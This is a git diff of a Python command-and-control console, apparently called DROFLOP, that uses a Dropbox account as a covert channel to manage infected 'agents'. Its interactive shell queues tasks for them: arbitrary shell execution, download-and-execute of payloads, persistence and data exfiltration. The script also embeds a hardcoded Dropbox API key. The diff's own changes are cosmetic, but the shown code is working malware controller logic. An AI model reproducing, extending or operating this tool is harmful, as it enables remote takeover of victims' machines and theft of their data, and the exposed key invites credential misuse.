@@ -8,29 +8,25 @@ import json
 #API KEY to access Dropbox
 apiKey = "drxEmLRljpAAAAAAAAAADQfl_issiL1iWeiaLuHhdkwXsIhSkzEhDhoNkZJp3ev2"
 banner = """
-$$$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$$\ $$\        $$$$$$\  $$$$$$$\  
-$$  __$$\ $$  __$$\ $$  __$$\ $$  _____|$$ |      $$  __$$\ $$  __$$\ 
-$$ |  $$ |$$ |  $$ |$$ /  $$ |$$ |      $$ |      $$ /  $$ |$$ |  $$ |
-$$ |  $$ |$$$$$$$  |$$ |  $$ |$$$$$\    $$ |      $$ |  $$ |$$$$$$$  |
-$$ |  $$ |$$  __$$< $$ |  $$ |$$  __|   $$ |      $$ |  $$ |$$  ____/ 
-$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |      $$ |  $$ |$$ |      
-$$$$$$$  |$$ |  $$ | $$$$$$  |$$ |      $$$$$$$$\  $$$$$$  |$$ |      
-\_______/ \__|  \__| \______/ \__|      \________| \______/ \__|                                   
+ ______   ______    _______  _______         _______  ___      _______  _______ 
+|      | |    _ |  |       ||       |       |       ||   |    |       ||       |
+|  _    ||   | ||  |   _   ||    _  | ____  |    ___||   |    |   _   ||    _  |
+| | |   ||   |_||_ |  | |  ||   |_| ||____| |   |___ |   |    |  | |  ||   |_| |
+| |_|   ||    __  ||  |_|  ||    ___|       |    ___||   |___ |  |_|  ||    ___|
+|       ||   |  | ||       ||   |           |   |    |       ||       ||   |    
+|______| |___|  |_||_______||___|           |___|    |_______||_______||___|                                      
          """
 
 # Create dropbox object
 dbx = dropbox.Dropbox(apiKey)
-
 offlineAgents = []
 activeAgents = []
 completedTasks = {}
 interactedAgent = ""
 
-
 # Check if agent is online -----WORK IN PROGRESS
 def isInsideTimeline(agent):
     return True
-
 
 class TaskChecker(object):
 
@@ -80,7 +76,6 @@ def taskUpdater(agent):
     mode = (dropbox.files.WriteMode.overwrite)
     try:
         _, res = dbx.files_download(path)
-        print (res.content)
         if (res.content != ""):
             tasks = json.loads(res.content)
         else:
@@ -100,9 +95,7 @@ def sendTask(agent, command):
     path = '/%s/tasks' % agent
     mode = (dropbox.files.WriteMode.add)
     defaultStatus = "Waiting"
-
     for file in dbx.files_list_folder('/%s/' % agent).entries:
-
         if (file.name == 'tasks'):
             mode = (dropbox.files.WriteMode.overwrite)
             _, res = dbx.files_download(path)
@@ -141,14 +134,13 @@ class AgentChecker:
                     agent = agent.name
                     if (agent not in activeAgents and isInsideTimeline(agent)):
                         activeAgents.append(agent)
-                        print ("[+] Agent " + agent + " is online [+]")
+                        print ("\n[+] Agent " + agent + " is online [+]")
                         completedTasks[agent] = []
                     elif (agent in activeAgents and not isInsideTimeline(agent)):
                         activeAgents.remove(agent)
                         del completedTasks[agent]
                         print ("\n[+] Agent " + agent + " is offline [+]")
                 time.sleep(self.interval)
-
             except dropbox.exceptions.ApiError as err:
                 print ("[-] HTTP Error [-]", err)
                 time.sleep(30)
@@ -157,6 +149,7 @@ class AgentChecker:
 
 def listAgents():
     print ("\n[+] Listing Agents [+]")
+    time.sleep(2)
     if (len(activeAgents) > 0):
         for agent in activeAgents:
             print (agent)
@@ -169,10 +162,9 @@ def changeInteractedAgent(agent):
     global interactedAgent
     interactedAgent = agent
 
-
 class Input(cmd.Cmd):
     AGENTS = activeAgents
-    pmt = "#DROPFLOP> "
+    prompt = "DROFLOP#> "
 
     def do_agents(self, s):
         listAgents()
@@ -183,7 +175,7 @@ class Input(cmd.Cmd):
             print("[+] Interacting with : " + agent + " [+]")
             changeInteractedAgent(agent)
             agentInteraction = AgentCMD()
-            agentInteraction.pmt = self.pmt + "(" + agent + "): "
+            agentInteraction.prompt = self.prompt + "(" + agent + "): "
             agentInteraction.cmdloop()
         else:
             print("[-] Agent not valid [-]")
@@ -221,30 +213,23 @@ class AgentCMD(cmd.Cmd):
 
     def do_exec(self, s):
         sendTask(interactedAgent, "{SHELL}%s" % s)
-
     def do_downloadexecute(self, s):
         sendTask(interactedAgent, "{DOWNLOAD}%s" % s)
-
     def do_persist(self, s):
         sendTask(interactedAgent, "persist")
-
     def do_exfil(self, s):
         sendTask(interactedAgent, "exfil")
-
     def do_back(self, s):
         interactedAgent = ""
         return True
-
     def emptyline(self):
         pass
-
 
 def main():
     print(banner)
     agents = AgentChecker()
     checker = TaskChecker()
     commandInputs = Input().cmdloop()
-
 
 if __name__ == "__main__":
     main()
